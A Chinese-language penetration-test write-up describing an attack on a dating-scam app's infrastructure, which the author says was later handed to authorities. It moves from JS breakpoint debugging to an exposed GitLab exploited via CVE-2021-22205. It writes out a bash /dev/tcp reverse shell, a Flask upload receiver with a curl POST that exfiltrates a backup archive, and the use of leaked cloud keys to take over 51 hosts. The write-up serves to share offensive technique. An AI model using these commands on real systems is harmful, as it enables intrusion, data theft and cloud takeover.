# 0x00 前言

本次分享主要是分享一次HC中的思路，值得大家学习，服务器已经交给相关部门进行取证等也已经打包结A了

# 0x01 信息收集

首先给到一个资产是二维码，是一张sese图片里面带有约炮的app下载，扫码后得到如下结果

![](./img/2196733565725864051.png)

得到如下结果  
<https://www.target.com>  
后进行访问主站

注册成功后发现全是妹子(........),这个时候先别急，咱第一步先去看他调用的JS资源  
随便点击一个资源然后刷新一下看他F12网络

这里首先我只能用当时留下的毫无关联的图片进行演示了，当时我看到的JS文件叫 "MyProfile"

![](./img/7693001281577088146.png)

# 0x02 JS断点调试

这个凭借个人感觉就是个关键信息(我的资料 - > 配置信息？)，

所以凭借这些理由，我在XHR中锁定了"MyProfile"这个关键字进行JS断点

![](./img/5758528231256552070.png)

然后刷新进行调试 在漫长的调试过程中我发现在一个很奇怪的JS文件中调用了我的MyProfile字段 叫/assets/index-xxxxxx.js

一般来说我就会去审计一下这个JS文件 结果发现好东西了

![](./img/2244134209180152631.png)

    
    
    bindgen: "git+http://123.123.123.123:1111/target2/a.git#0.0.14"
    

# 0x03 新突破

我当时就立刻去访问了一下 发现竟然是一个gitlab!

![](./img/2077446062114379529.png)  
找了一下历史漏洞 直接 CVE-2021-22205 直接梭哈 成功拿到shell

![](./img/3060739305386413569.png)

由于是执行命令，所以写了shell反弹

    
    
    echo 'bash -i >& /dev/tcp/123.123.123.123/1111 0>&1' > /tmp/haha.sh
    chmod +x /tmp/haha.sh
    /bin/bash /tmp/haha.sh
    

成功反弹shell

![](./img/2641138180231907585.png)

发现是ubunto的16.04
但是本地提权失败，找了SUID也没有办法，想尽了各种办法都没办法提权，打算放弃了，所以接下来就是去寻找Git权限能做的操作，找了一个下午，最终找到了backups目录里下找到了一个backup的tar包，应该八成就是gitlab上的备份了

![](./img/8864884059955022251.png)

# Flask之取文件

但是问题来了，我怎么做到在我反弹shell中把文件拖出来了呢？scp等都试过了不行，于是乎我就写了个flask的上传页面让shell去curl一下把文件post上来(感觉这思路骚的)

我的服务器

    
    
    from flask import Flask,request
    import os
    
    app = Flask(__name__)
    
    @app.route('/upload',methods=['POST'])
    def upload_file():
        file = request.files.get('file')
        if file :
            filename = file.filename
            file.save(os.path.join(os.getcwd(),filename))
            return f"File {filename} saved successfully"
        else:
            return "worry"
    
    
    if  __name__ == '__main__':
        app.run(host='0.0.0.0',debug=True,port=5000)
    

受控主机shell

    
    
    curl -X POST http://123.123.123.123:1111/upload -F file=@./a.gitlab_backup.tar
    

# 0x04 云沦陷(泄露AK SK)

几个G，下载漫长的很呢

然后拖到本地后应该就是gitlab的备份了，(因为他备份文件名字中带有gitlab的版本号)要用到对应的gitlab的相应版本去搭建，然后本地搭建导入备份后慢慢的寻找一些有用信息，后面突然发现一个叫application.yaml的文件
进行审计后泄露了ak和sk(这开发倒是备份挺明白的全部都写清清楚楚)

![](./img/8448616151268518299.png)  
这个时候行云管家一把梭哈，因为权限很大，接管整个云了，总共是51台主机都拿下了

# 0x05 总结

思路就是 ： 打点 -> JS文件断点调试 ->新突破上shell-> 解决困难-> 发现新大陆(本地搭建)->
接管云，最后全部打包好给了JF，也进行取证立A了，到此因为一个JS文件拿下整个云结束了，思路可以学习一波。

